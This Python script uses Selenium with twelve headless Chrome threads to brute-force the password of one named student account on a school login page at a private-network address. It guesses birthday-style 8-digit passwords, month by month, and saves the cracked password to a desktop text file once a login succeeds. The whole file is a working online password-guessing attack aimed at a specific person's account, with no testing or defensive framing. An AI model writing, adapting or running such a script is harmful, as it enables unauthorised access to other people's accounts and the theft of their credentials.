from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import threading

couts=0

jieshu = True

password_list = [
    '01019400',
    '02019400',
    '03019400',
    '04050500',
    '05019400',
    '06019400',
    '07019400',
    '08019400',
    '09019400',
    '10019400',
    '11019400',
    '12019400',
]

password_final_list = [
    '01319999',
    '02319999',
    '03319999',
    '04319999',
    '05319999',
    '06319999',
    '07319999',
    '08319999',
    '09319999',
    '10319999',
    '11319999',
    '12319999',
]

username = "1600301024"

def daohao(num):
    global couts
    global jieshu
    global username
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')

    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.get("http://172.16.1.99/student/public/login.asp")
    password = int(password_list[num])
    while jieshu:
        couts+=1
        password = int(password)
        if password > int(password_final_list[num]):
            break
        password+=1
        password = str(password)
        if len(password) < 8:
            password = '0'+password
        month_days = int(password[2] + password[3])
        if month_days == 31:
            month = str('0' + str(int(password[0]+password[1]) + 1))

            password = month[0] + month[1] + '0'*2 + password[4::]
        print("当前尝试密码：",password,"*"*10,couts,num)

        user  = driver.find_element_by_name("username")
        pw = driver.find_element_by_name("passwd")
        bt = driver.find_element_by_name("login")

        user.send_keys(username)
        pw.send_keys(password)

        bt.click()

        try:
            error = driver.find_element_by_tag_name("b")
        except:
            print("-"*60 + "正确的密码是：",password)
            jieshu=False
            f= open(r'C:\Users\ASUSPC\Desktop\嗯.txt',mode='w',encoding='utf-8')
            f.write(password)
            break

for i in range(12):
    threading.Thread(target=daohao,args=(i,)).start()
    time.sleep(2)

